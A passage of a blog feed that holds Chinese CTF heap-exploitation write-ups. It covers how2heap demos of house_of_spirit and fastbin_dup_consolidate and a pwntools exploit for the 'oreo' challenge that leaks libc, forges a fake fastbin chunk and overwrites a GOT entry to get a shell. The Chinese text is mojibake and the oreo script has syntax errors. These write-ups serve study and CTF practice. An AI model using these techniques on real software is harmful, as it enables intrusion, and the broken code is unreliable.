class="string">&#x27;DEL&#x27;</span>) <span class="comment"># malloc(8) triggers one_gadget</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>â€‹        ps.ä¸è¿‡æœ‰ä¸€ä¸ªåœ°æ–¹ä¸€ç›´æ²¡å¼„æ˜ç™½ï¼šå‰é¢è¯´çš„æ¯ä¸€æ¬¡PUTéƒ½ä¼šmallc()3æ¬¡ï¼Œè€Œä¸”ç†åº”æ˜¯è¿ç»­åœ°å€çš„ä¸‰ä¸ªchunkï¼Œä½†æ˜¯CTF-Wikiçš„è§£æ³•ï¼Œä»¥åŠå„ç§å…¶ä»–å¸ˆå‚…çš„è§£æ³•éƒ½åªè€ƒè™‘äº†data chunkï¼Œæˆ‘å’Œåˆ˜è€æ¿å€’æ˜¯è€ƒè™‘äº†ä¸‰ä¸ªchunkè¿ç»­çš„æƒ…å†µï¼Œä½†æ˜¯æˆ‘æ²¡æ•´å‡ºæ¥ã€‚æš‚æ—¶å…ˆæŒ‰ç…§writeupçš„æ¥å§ã€‚ã€‚ä¹‹åå†å›å¤´çœ‹çœ‹ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House_of_spirit</title>
      <link href="2020/03/06/house-of-spirit/"/>
      <url>2020/03/06/house-of-spirit/</url>
      
        <content type="html"><![CDATA[<p>â€‹        Fastbin Attack ä¸­çš„ house_of_spiritã€‚ (ç²¾ç¥å®¶å›­ï¼Ÿï¼Ÿ)<span id="more"></span></p><h2 id="0x00-house-of-spirit"><a href="#0x00-house-of-spirit" class="headerlink" title="0x00 . house_of_spirit"></a>0x00 . house_of_spirit</h2><p>â€‹        æŒ‰ç…§æƒ¯ä¾‹ã€‚ã€‚ã€‚çœ‹çœ‹how2heapçš„ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">16</span>)));</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        è¯´å®è¯ï¼Œè¿™ä¸ªä»£ç çœ‹å¾—è„‘å£³ç–¼ï¼Œæ²¡å®Œå…¨çœ‹æ‡‚ã€‚</p><p>â€‹        å¤§æ¦‚çš„æ”»å‡»æ€è·¯å°±æ˜¯ï¼Œæ‰¾ä¸€ä¸ªå¯æ§çš„åŒºåŸŸï¼Œæ¯”å¦‚æ ˆï¼Œbssæ®µï¼Œå¯è¯»å¯å†™çš„ï¼Œåœ¨æ­¤åŒºåŸŸå†™ä¸€ä¸ªfake fast chunkï¼Œç„¶åæƒ³åŠæ³•freeæ‰ï¼Œè¿™ä¹ˆä¸€æ¥å°±æ‰è¿›äº†fastbiné‡Œé¢ã€‚å› ä¸ºfake fast chunkåœ¨é“¾è¡¨å¤´(main_arenaæŒ‡å‘)ï¼Œæ‰€ä»¥mallocåfake chunkä¼šç›´æ¥åˆ†é…å‡ºæ¥ï¼Œç„¶åå°±å¯ä»¥ä»»æ„è¯»å†™éšæ„æµªäº†ã€‚</p><h2 id="0x01-oreo-ğŸª"><a href="#0x01-oreo-ğŸª" class="headerlink" title="0x01 . oreo  ğŸª"></a>0x01 . oreo  ğŸª</h2><h3 id="A-ELF-Analysis"><a href="#A-ELF-Analysis" class="headerlink" title="A . ELF Analysis"></a>A . ELF Analysis</h3><p>â€‹        æ˜æ˜æ˜¯ä¸ªä¹°æªçš„ç¨‹åºã€‚ã€‚ã€‚ä¸ºå•¥å«å¥¥åˆ©å¥¥</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" /><p>â€‹        èŠ±é‡Œèƒ¡å“¨çš„æœ€å–œæ¬¢äº†ğŸ˜¬ğŸ˜¬ğŸ˜¬</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /><p>â€‹        ä¸»è¦å‡½æ•°å¦‚ä¸‹</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" /><p>â€‹        addå‡½æ•°é‡Œå¯ä»¥å‘ç°ï¼Œç¨‹åºæ·»åŠ chunkæ—¶ï¼Œä¼šå½¢æˆè¿™æ ·çš„ä¸€ç§é“¾è¡¨ç»“æ„ï¼š</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/4.jpg" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:20%;" /><p>â€‹        å¹¶ä¸”å­˜åœ¨æ˜æ˜¾çš„æº¢å‡ºï¼Œæ‰€ä»¥å¯ä»¥ä¼°æ‘¸ç€è¦†ç›–æ‰nextæŒ‡é’ˆã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/5.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" /><p>â€‹        show()ï¼šå±•ç¤ºæ‰€æœ‰è®¢å•çš„descriptionå’Œnameã€‚</p><p>â€‹        order()ï¼šä¸‹å•ï¼Œå¹¶åˆ é™¤å‰é¢æ‰€æœ‰chunkã€‚</p><p>â€‹        leave()ï¼šåœ¨è®¢å•ä¸­å¤‡æ³¨ï¼Œç”¨åˆ°äº†messageæŒ‡é’ˆ(bssæ®µ)ï¼Œè€ŒmessageæŒ‡é’ˆåœ¨ç¨‹åºå¼€å¤´å°±æŒ‡å‘äº†message_ptrã€‚</p><p>â€‹        stats()ï¼šè¾“å‡ºè®¢å•æ•°å’Œå¤‡æ³¨æ•°ä»¥åŠæœ€è¿‘ä¸€æ¬¡å¤‡æ³¨å†…å®¹ï¼Œå¯ä»¥ç”¨ä½œè¾“å‡ºã€‚</p><p>â€‹        ç¨‹åºä¸­ç”¨åˆ°çš„è®¸å¤šé‡è¦æŒ‡é’ˆéƒ½èƒ½åœ¨bssæ®µæ‰¾åˆ°ï¼š</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/6.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 80%;" /><h3 id="B-Main-ideas-ğŸ’¡"><a href="#B-Main-ideas-ğŸ’¡" class="headerlink" title="B . Main ideas  ğŸ’¡"></a>B . Main ideas  ğŸ’¡</h3><ul><li><p>å †æº¢å‡ºæ„é€ é“¾è¡¨ï¼ŒLeak libc_baseã€‚</p></li><li><p>ä¼ªé€ fake chunkï¼Œå¹¶ä¸”ç»•è¿‡æ£€æµ‹</p></li><li><p>Getshell</p></li></ul><h3 id="C-Step-by-Step"><a href="#C-Step-by-Step" class="headerlink" title="C . Step by Step"></a>C . Step by Step</h3><h4 id="1-Leak-libc-base"><a href="#1-Leak-libc-base" class="headerlink" title="1.Leak libc_base"></a>1.Leak libc_base</h4><ul><li>æ–°å»ºä¸€ä¸ªchunkï¼Œé€šè¿‡æº¢å‡ºä½¿å¾—å…¶nextæŒ‡é’ˆæŒ‡å‘puts@got</li><li>show()æŸ¥çœ‹æ‰€æœ‰chunkçš„å†…å®¹ï¼Œå¾—åˆ°puts_addr</li><li>é€šè¿‡è®¡ç®—å¾—åˆ°libc_baseï¼Œsystem@gotã€‚</li></ul><h4 id="2-Arrange-fake-chunk"><a href="#2-Arrange-fake-chunk" class="headerlink" title="2.Arrange fake chunk"></a>2.Arrange fake chunk</h4><ul><li><p>å¾ªç¯æ–°å»ºchunkï¼Œå½“count_in_add == 0x3fï¼Œé€€å‡ºå¾ªç¯ã€‚</p></li><li><p>æ­¤æ—¶å†æ–°å»ºä¸€ä¸ªchunkæ„é€ fake chunkã€‚æ­¤æ—¶count_in_add == 0x40ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç”¨ä½œfake chunk size</p></li><li><p>fake chunkç»“æ„å¦‚ä¸‹ï¼š</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/7.jpg" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 25%;" /></li><li><p>æŠŠfake chunkçš„next chunkçš„pre_sizeä¹Ÿç»™æ”¹äº†ï¼Œå°±èƒ½ç»•è¿‡æµ‹è¯•äº†ã€‚</p></li><li><p>ä¸‡äº‹ä¿±å¤‡ï¼Œç”¨order()æ¥freeæ‰æ•´ä¸ªé“¾è¡¨ï¼Œç„¶åmain_arenaå°±æŒ‡å‘äº†æœ€åçš„fake chunkã€‚</p><h4 id="3-Getshell"><a href="#3-Getshell" class="headerlink" title="3.Getshell"></a>3.Getshell</h4></li><li><p>ç°åœ¨æˆ‘ä»¬add()å°±èƒ½å¾—åˆ°fake chunkï¼Œå†åœ¨é‡Œé¢å†™å…¥fgets@gotï¼Œä¹Ÿå°±æ˜¯å†™å…¥åˆ°äº†fake chunkçš„fdä½ç½®ã€‚fgets@gotåœ¨èœå•å¾ªç¯çš„switchçš„å‚æ•°å‡½æ•°ä¸­ä¼šç”¨åˆ°ã€‚è€Œçº¢è‰²ç®­å¤´ä½ç½®å°±æ˜¯æˆ‘ä»¬è¦å†™å…¥â€œ/bin/shâ€çš„åœ°å„¿ã€‚</p></li></ul><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/8.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/house_of_spirit/8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 80%;" /><ul><li>è¿™æ—¶å†ç”¨leave()å‡½æ•°ï¼Œä¿®æ”¹messageã€‚æ³¨æ„æ­¤æ—¶messageä¸fake chunkçš„fdæ˜¯åŒä¸€åœ°å€ï¼Œä¸Šé¢çš„fake chunkç»“æ„å›¾æ¯”è¾ƒæ¸…æ¥šã€‚å°†messageä¸­å†…å®¹(fgets@got)æ”¹æˆsystem@gotã€‚</li><li>ç°åœ¨ç›´æ¥é€å…¥â€/bin/sh\x00â€å°±è¡Œå•¦ã€‚</li></ul><h3 id="D-Exploit"><a href="#D-Exploit" class="headerlink" title="D . Exploit"></a>D . Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">des,name</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Rifle name: &quot;</span>,name)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Rifle description: &quot;</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;===================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntill(<span class="string">&quot;Okay order submitted!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span>(<span class="params">message</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your order:&quot;</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stats</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">puts_got = elf.gots[puts]</span><br><span class="line">free_got = elf.gots[free]</span><br><span class="line">puts_offset = libc.symbols[puts]</span><br><span class="line">system_offset = libc.symbols[system]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================Leak libc base============================</span></span><br><span class="line">payload = <span class="number">27</span> * <span class="string">&#x27;X&#x27;</span> + p32(puts_got)<span class="comment">#so the next chunk we could recv puts_got</span></span><br><span class="line">add(<span class="string">&quot;Nothing&quot;</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;===================================&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">puts_plt = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])<span class="comment">#got the ture addr of puts</span></span><br><span class="line">libc_base = puts_plt - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================Arrange fake chunk==========================</span></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> num&lt;3f :<span class="comment">#System will break the circle while num (count_in_add) == 3f</span></span><br><span class="line">add(<span class="built_in">str</span>(num),<span class="string">&quot;gun&quot;</span>+<span class="built_in">str</span>(num))</span><br><span class="line">num++</span><br><span class="line">payload = <span class="number">27</span> * <span class="string">&#x27;X&#x27;</span> + p32(<span class="number">0x0804A2A8</span>)<span class="comment">#But 0x0804A2A8(massage) is now saving the message_ptr</span></span><br><span class="line">add(<span class="string">&quot;Nothing&quot;</span>,payload)<span class="comment">#count_in_add == 0x40,so it can be used as the size of fake_chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span> * <span class="string">&#x27;X&#x27;</span> + p32(<span class="number">0x40</span>)</span><br><span class="line">leave(payload)<span class="comment">#now the fake_chunk is in the link_list and able to bypass the test</span></span><br><span class="line">order()<span class="comment">#delete the linklist,so the fake_chunk is in the fastbin now</span></span><br><span class="line"><span class="comment">#============================Getshell=============================</span></span><br><span class="line">fgets_got = elf.got[fgets]</span><br><span class="line">add(fgets_got,<span class="string">&quot;Nothing&quot;</span>)<span class="comment">#the fake_chunk was malloced since it is in the bin_top</span></span><br><span class="line">leave(system_addr)<span class="comment">#fgets_got was changed to system_addr</span></span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)<span class="comment">#fgets(&quot;/bin/sh&quot;) &lt;====&gt; system(&quot;/bin/sh&quot;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SleepHolder</title>
      <link href="2020/03/03/SleepHolder/"/>
      <url>2020/03/03/SleepHolder/</url>
      
        <content type="html"><![CDATA[<p>â€‹                å…³äºfastbin_dup_consolidateï¼Œä»¥åŠunlinkçš„å¦ä¸€é¢˜ã€‚<span id="more"></span></p><p>â€‹                ä»Šå¤©åšé¢˜è¿˜æŒºå¿«ï¼Œæ¯•ç«Ÿæ˜¯ä¹‹å‰å·²ç»ç ”ç©¶è¿‡ä¸€ç‚¹çš„é¢˜ç›®ã€‚</p><h2 id="0x00-fastbin-dup-consolidate"><a href="#0x00-fastbin-dup-consolidate" class="headerlink" title="0x00 . fastbin_dup_consolidate"></a>0x00 . fastbin_dup_consolidate</h2><p>â€‹                è´´ä¸€ä¸‹ä»£ç ä½œä¸ºä¾‹å­ã€‚ã€‚(code from how2heap)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span> p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Allocated two fastbins p1=%p p2=%pn, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Now free p1!n);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Allocated large bin to trigger <span class="built_in">malloc_consolidate</span>() p3=%pn, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, In <span class="built_in">malloc_consolidate</span>(), p1 is moved to the unsorted bin.n);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Trigger the <span class="keyword">double</span> free vulnerability!n);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, We can pass the check in <span class="built_in">malloc</span>() since p1 is <span class="keyword">not</span> fast top.n);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Now p1 is in unsorted bin <span class="keyword">and</span> fast bin. So we<span class="number">&#x27;</span>will get it twice %p %pn, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹                ä»£ç è¯´æ˜äº†ä¸¤ä»¶äº‹ï¼š</p><p>â€‹                1ã€è¦å®ç°doubleå¹¶éåªèƒ½ç”¨é‡Šæ”¾å †å—æ¥æ©æŠ¤ï¼šfree(1);free(2);free(1);è¿˜å¯ä»¥ç”³è¯·å †å—æ¥æ©æŠ¤ï¼šfree(1);malloc(2);free(1);</p><p>â€‹                2ã€ç³»ç»Ÿåœ¨åˆ†é…large chunkçš„æ—¶å€™ä¼šè°ƒç”¨malloc_consolidate()ï¼Œè¿™ä¸ªå‡½æ•°ç›¸å½“äºfree()ï¼Œå°±æ˜¯ä¸€ä¸ªå›æ”¶å‡½æ•°ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å°†fastbinä¸­çš„chunkæ•´ç†ä¸€ä¸‹ï¼Œèƒ½åˆå¹¶å°±åˆå¹¶ï¼Œä¸èƒ½åˆå¹¶ä¹Ÿæ¸…é™¤ä¸€ä¸‹ä½¿ç”¨æ ‡å¿—ä½(inuse = 0)ï¼Œç„¶åå…¨éƒ¨ä¸¢åˆ°unsort biné‡Œé¢ã€‚</p><p>â€‹                3ã€æ‰€ä»¥å¦‚æœå†malloc()ä¸€æ¬¡ï¼Œå°±å¯ä»¥å¤šfree(1)ä¸€æ¬¡ï¼Œå› ä¸ºäººå®¶æœ¬æ¥ä¹Ÿä¸åœ¨fast binï¼Œè€Œä¸”ä¹Ÿä¸è¢«top chunkæ‰€æŒ‡ã€‚</p><h2 id="0x01-SleepyHolder-Write-Up"><a href="#0x01-SleepyHolder-Write-Up" class="headerlink" title="0x01 . SleepyHolder Write Up"></a>0x01 . SleepyHolder Write Up</h2><h3 id="A-åˆ†æç¨‹åº"><a 